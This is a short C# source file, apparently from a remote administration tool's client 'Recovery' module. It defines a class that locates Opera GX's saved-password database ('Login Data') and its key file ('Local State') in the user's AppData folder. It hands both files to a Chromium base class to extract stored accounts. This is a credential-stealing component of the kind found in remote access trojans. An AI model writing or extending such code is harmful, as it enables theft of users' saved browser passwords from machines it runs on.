using RemoteAdmin.Shared;
using System;
using System.Collections.Generic;
using System.IO;

namespace RemoteAdmin.Client.Recovery.Browsers
{
    public class OperaGXPassReader : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Opera GX";

        /// <inheritdoc />
        public override List<RecoveredAccount> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera GX Stable\\Login Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera GX Stable\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[OperaGX] Exception in ReadAccounts: {ex.Message}");
                return new List<RecoveredAccount>();
            }
        }
    }
}